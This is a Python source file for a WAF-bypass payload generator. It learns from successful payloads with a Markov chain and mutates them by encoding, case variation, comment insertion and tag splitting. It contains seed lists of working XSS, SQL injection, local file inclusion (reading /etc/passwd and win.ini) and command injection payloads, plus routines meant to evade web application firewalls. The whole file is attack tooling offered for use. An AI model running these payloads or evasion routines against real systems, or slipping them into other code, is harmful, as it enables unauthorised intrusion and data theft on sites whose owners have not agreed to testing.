"""
Intelligent Payload Generator - Markov Chain + Mutations

Generates new, unique payloads from successful ones to bypass WAF.
Uses Markov Chain to learn patterns and mutation strategies.

Features:
- Markov Chain payload generation (learns from successful payloads)
- 10+ mutation strategies (encoding, obfuscation, case variation)
- Context-aware generation (XSS, SQLi, LFI specific)
- Generates 50+ unique variants per payload

Usage:
    generator = PayloadGenerator()
    generator.train(successful_payloads)

    new_payloads = generator.generate(count=50, vuln_type='xss')
    print(f"Generated {len(new_payloads)} new payloads!")
"""

import random
import re
import json
import urllib.parse
from collections import defaultdict
from typing import List, Dict, Optional, Set
import os


class PayloadGenerator:
    """
    Intelligent Payload Generator using Markov Chain + Mutations

    Learns from successful payloads and generates new variants to bypass WAF.
    """

    def __init__(self):
        """Initialize Payload Generator"""
        # Markov chain: token -> list of possible next tokens
        self.chain = defaultdict(list)

        # Successful payloads database
        self.successful_payloads = {
            'xss': [],
            'sqli': [],
            'lfi': [],
            'cmdi': [],
            'other': [],
        }

        # Seed payloads (basic patterns to start with)
        self._load_seed_payloads()

    def _load_seed_payloads(self):
        """Load seed payloads for each vulnerability type"""

        # XSS seed payloads (SecLists-style)
        self.seed_payloads_xss = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(document.domain)</script>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "javascript:alert(1)",
            "<img src=x:alert(1) onerror=eval(src)>",
            "<svg><script>alert(1)</script></svg>",
            "<math><mi xlink:href=javascript:alert(1)>test",
        ]

        # SQLi seed payloads
        self.seed_payloads_sqli = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "' OR 1=1#",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or ('1'='1",
            "1' ORDER BY 1--+",
            "1' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "1' AND 1=2 UNION SELECT NULL, NULL--",
        ]

        # LFI seed payloads
        self.seed_payloads_lfi = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../../../../etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "expect://whoami",
            "file:///etc/passwd",
        ]

        # Command Injection seed payloads
        self.seed_payloads_cmdi = [
            "; whoami",
            "| whoami",
            "|| whoami",
            "& whoami",
            "&& whoami",
            "`whoami`",
            "$(whoami)",
            "; ls -la",
            "| cat /etc/passwd",
            "; ping -c 4 127.0.0.1",
        ]

    def _tokenize(self, payload: str) -> List[str]:
        """
        Tokenize payload into meaningful parts

        Example:
            "<script>alert(1)</script>" ->
            ["<script>", "alert", "(", "1", ")", "</script>"]
        """
        # Regex pattern to capture tags, words, symbols
        pattern = r'<[^>]+>|[a-zA-Z_]\w*|\d+|[^\w\s]|\s+'
        tokens = re.findall(pattern, payload)

        # Filter out pure whitespace tokens
        tokens = [t for t in tokens if t.strip()]

        return tokens

    def train(self, successful_payloads: List[str], vuln_type: str = 'other'):
        """
        Train Markov Chain on successful payloads

        Args:
            successful_payloads: List of payloads that worked
            vuln_type: Type of vulnerability ('xss', 'sqli', 'lfi', 'cmdi')
        """
        if not successful_payloads:
            print("⚠️  No payloads provided for training")
            return

        # Store payloads
        vuln_type = vuln_type.lower()
        if vuln_type not in self.successful_payloads:
            vuln_type = 'other'

        self.successful_payloads[vuln_type].extend(successful_payloads)

        # Build Markov chain
        for payload in successful_payloads:
            tokens = self._tokenize(payload)

            # Build chain: token[i] -> token[i+1]
            for i in range(len(tokens) - 1):
                current_token = tokens[i]
                next_token = tokens[i + 1]
                self.chain[current_token].append(next_token)

        print(f"✅ Trained on {len(successful_payloads)} {vuln_type} payloads")
        print(f"   Markov chain has {len(self.chain)} unique tokens")

    def generate_markov(self, count: int = 10, vuln_type: str = 'xss') -> List[str]:
        """
        Generate new payloads using Markov Chain

        Args:
            count: Number of payloads to generate
            vuln_type: Type of vulnerability

        Returns:
            List of generated payloads
        """
        if not self.chain:
            # Use seed payloads if chain is empty
            print("⚠️  Markov chain empty, training on seed payloads...")
            self._train_on_seeds(vuln_type)

        payloads = []
        successful = self.successful_payloads.get(vuln_type, [])

        if not successful:
            # Use seed payloads
            successful = getattr(self, f'seed_payloads_{vuln_type}', self.seed_payloads_xss)

        for _ in range(count):
            # Start with random successful payload
            start_payload = random.choice(successful)
            tokens = self._tokenize(start_payload)

            if not tokens:
                continue

            # Generate new payload using Markov chain
            new_tokens = []
            current = random.choice(tokens)
            new_tokens.append(current)

            # Generate 3-10 more tokens
            for _ in range(random.randint(3, 10)):
                if current in self.chain and self.chain[current]:
                    current = random.choice(self.chain[current])
                    new_tokens.append(current)
                else:
                    break

            # Join tokens
            payload = ''.join(new_tokens)

            # Filter out invalid/duplicate payloads
            if len(payload) > 5 and payload not in payloads:
                payloads.append(payload)

        return payloads

    def _train_on_seeds(self, vuln_type: str):
        """Train on seed payloads if no user data available"""
        seeds = getattr(self, f'seed_payloads_{vuln_type}', self.seed_payloads_xss)
        self.train(seeds, vuln_type)

    def mutate(self, payload: str, vuln_type: str = 'xss') -> List[str]:
        """
        Apply mutation strategies to generate variants

        Mutation strategies:
        1. Case variation (MiXeD CaSe)
        2. URL encoding (%3C%3E)
        3. Double encoding (%253C)
        4. HTML entity encoding (&lt;&gt;)
        5. Unicode encoding (\u003c)
        6. Null byte injection (%00)
        7. Comment injection (/**/)
        8. Whitespace variation (spaces, tabs, newlines)
        9. Quote variation (' vs ")
        10. Concat variations (+, . for SQL)

        Args:
            payload: Original payload
            vuln_type: Type of vulnerability

        Returns:
            List of mutated payloads
        """
        mutations = []

        # 1. Case variations
        mutations.append(payload.upper())
        mutations.append(payload.lower())
        mutations.append(self._mixed_case(payload))

        # 2. URL encoding
        mutations.append(urllib.parse.quote(payload))

        # 3. Double URL encoding
        mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))

        # 4. HTML entity encoding (for XSS)
        if vuln_type == 'xss':
            mutations.append(self._html_encode(payload))

        # 5. Unicode encoding
        mutations.append(self._unicode_encode(payload))

        # 6. Null byte injection
        mutations.append(payload + '%00')
        mutations.append('%00' + payload)

        # 7. Comment injection
        if vuln_type == 'xss':
            mutations.append(payload.replace('>', '/**/>'))
            mutations.append(payload.replace('<', '</**/'))
        elif vuln_type == 'sqli':
            mutations.append(payload.replace(' ', '/**/'))
            mutations.append(payload.replace('=', '/**/=/**/'))

        # 8. Whitespace variations
        mutations.append(payload.replace(' ', '\t'))
        mutations.append(payload.replace(' ', '\n'))
        mutations.append(payload.replace(' ', '%20'))

        # 9. Quote variation
        mutations.append(payload.replace("'", '"'))
        mutations.append(payload.replace('"', "'"))

        # 10. Concatenation (SQLi specific)
        if vuln_type == 'sqli':
            # MySQL: 'ad'+'min' = 'admin'
            if 'admin' in payload:
                mutations.append(payload.replace('admin', "'ad'+'min'"))
                mutations.append(payload.replace('admin', "CONCAT('ad','min')"))

        # 11. Polyglot variations (work in multiple contexts)
        if vuln_type == 'xss':
            mutations.append(f"';{payload}//")
            mutations.append(f'";{payload}//')
            mutations.append(f"'>{payload}<!--")

        # Remove duplicates and original
        mutations = list(set(mutations))
        if payload in mutations:
            mutations.remove(payload)

        return mutations

    def _mixed_case(self, text: str) -> str:
        """Generate MiXeD CaSe version"""
        return ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(text))

    def _html_encode(self, text: str) -> str:
        """HTML entity encode"""
        html_entities = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '&': '&amp;',
        }
        for char, entity in html_entities.items():
            text = text.replace(char, entity)
        return text

    def _unicode_encode(self, text: str) -> str:
        """Unicode encode (\\uXXXX)"""
        encoded = ''
        for char in text:
            if char.isalnum():
                encoded += char
            else:
                encoded += f'\\u{ord(char):04x}'
        return encoded

    def generate(self, count: int = 50, vuln_type: str = 'xss',
                 include_mutations: bool = True) -> List[str]:
        """
        Generate new payloads using Markov Chain + Mutations

        Args:
            count: Total number of payloads to generate
            vuln_type: Vulnerability type ('xss', 'sqli', 'lfi', 'cmdi')
            include_mutations: Whether to include mutations (default: True)

        Returns:
            List of unique payloads
        """
        all_payloads = set()

        # 1. Generate Markov-based payloads (50% of total)
        markov_count = count // 2
        markov_payloads = self.generate_markov(markov_count, vuln_type)
        all_payloads.update(markov_payloads)

        # 2. Generate mutations of successful payloads (50% of total)
        if include_mutations:
            successful = self.successful_payloads.get(vuln_type, [])
            if not successful:
                # Use seed payloads
                successful = getattr(self, f'seed_payloads_{vuln_type}', self.seed_payloads_xss)

            # Mutate random successful payloads
            mutation_count = count - len(markov_payloads)
            for _ in range(mutation_count):
                if successful:
                    base_payload = random.choice(successful)
                    mutations = self.mutate(base_payload, vuln_type)
                    if mutations:
                        all_payloads.add(random.choice(mutations))

        # Convert to list and limit to requested count
        result = list(all_payloads)[:count]

        print(f"🧬 Generated {len(result)} unique {vuln_type} payloads")
        print(f"   - Markov chain: {len(markov_payloads)}")
        print(f"   - Mutations: {len(result) - len(markov_payloads)}")

        return result

    def generate_waf_bypass(self, original_payload: str, vuln_type: str = 'xss',
                            count: int = 20) -> List[str]:
        """
        Generate WAF bypass variants of a specific payload

        Focuses on encoding and obfuscation techniques to bypass WAF rules.

        Args:
            original_payload: The payload that was blocked by WAF
            vuln_type: Vulnerability type
            count: Number of bypass variants to generate

        Returns:
            List of WAF bypass payloads
        """
        bypasses = set()

        # Add all mutations
        mutations = self.mutate(original_payload, vuln_type)
        bypasses.update(mutations)

        # XSS-specific WAF bypasses
        if vuln_type == 'xss':
            # Remove spaces
            bypasses.add(original_payload.replace(' ', ''))

            # Add newlines
            bypasses.add(original_payload.replace('>', '>\n'))

            # Split tags
            if '<script>' in original_payload:
                bypasses.add(original_payload.replace('<script>', '<scr<script>ipt>'))

            # Use different event handlers
            bypasses.add(original_payload.replace('onerror', 'onload'))
            bypasses.add(original_payload.replace('alert', 'confirm'))
            bypasses.add(original_payload.replace('alert', 'prompt'))

        # SQLi-specific WAF bypasses
        elif vuln_type == 'sqli':
            # Remove spaces with comments
            bypasses.add(original_payload.replace(' ', '/**/'))

            # Use OR instead of ||
            bypasses.add(original_payload.replace('||', ' OR '))

            # Add redundant conditions
            bypasses.add(f"{original_payload} AND 1=1")

            # Use different comment styles
            bypasses.add(original_payload.replace('--', '#'))

        # Limit to requested count
        result = list(bypasses)[:count]

        print(f"🔓 Generated {len(result)} WAF bypass variants")

        return result

    def save_payloads(self, filepath: str):
        """Save successful payloads database to JSON"""
        with open(filepath, 'w') as f:
            json.dump(self.successful_payloads, f, indent=2)
        print(f"✅ Payloads saved to: {filepath}")

    def load_payloads(self, filepath: str):
        """Load payloads database from JSON"""
        if not os.path.exists(filepath):
            print(f"⚠️  File not found: {filepath}")
            return

        with open(filepath, 'r') as f:
            self.successful_payloads = json.load(f)

        # Retrain Markov chain
        for vuln_type, payloads in self.successful_payloads.items():
            if payloads:
                self.train(payloads, vuln_type)

        print(f"✅ Payloads loaded from: {filepath}")


if __name__ == '__main__':
    # Demo usage
    print("Intelligent Payload Generator - Demo")
    print("=" * 60)

    # Create generator
    generator = PayloadGenerator()

    # Train on some successful XSS payloads
    successful_xss = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
    ]

    generator.train(successful_xss, 'xss')

    # Generate new XSS payloads
    print("\n🧬 Generating new XSS payloads...")
    new_payloads = generator.generate(count=20, vuln_type='xss')

    print(f"\nGenerated {len(new_payloads)} new payloads:")
    for i, payload in enumerate(new_payloads[:10], 1):
        print(f"  {i}. {payload}")

    # Generate WAF bypass variants
    print("\n🔓 Generating WAF bypass variants...")
    bypasses = generator.generate_waf_bypass(
        "<script>alert(1)</script>",
        vuln_type='xss',
        count=10
    )

    print(f"\nGenerated {len(bypasses)} WAF bypass variants:")
    for i, payload in enumerate(bypasses[:5], 1):
        print(f"  {i}. {payload}")
